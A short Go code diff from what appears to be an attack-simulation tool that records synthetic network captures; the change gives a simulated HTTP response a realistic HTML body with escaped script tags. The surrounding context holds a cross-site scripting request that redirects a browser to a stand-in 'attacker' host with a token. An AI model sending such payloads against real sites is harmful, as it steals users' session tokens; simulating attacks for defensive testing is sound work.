@@ -451,7 +451,8 @@ func runXSSInjection(req AttackRequest) (*AttackResult, error) {
 
 		// PCAP
 		reqPayload := []byte(fmt.Sprintf("GET /search?q=<script>document.location='http://attacker/%s'</script> HTTP/1.1\r\nHost: %s\r\n\r\n", token, targetIP))
-		respPayload := []byte("HTTP/1.1 200 OK\r\nContent-Length: 1234\r\n\r\n")
+		respBody := "<html><body>Search results for: &lt;script&gt;...&lt;/script&gt;</body></html>"
+		respPayload := []byte(fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: %d\r\n\r\n%s", len(respBody), respBody))
 		path, _ := PCAPGenericTCPExchange(req.RunID, "xss_injection", req.AttackerIP, targetIP, 80, reqPayload, respPayload)
 		if path != "" {
 			result.PCAPFiles = append(result.PCAPFiles, path)
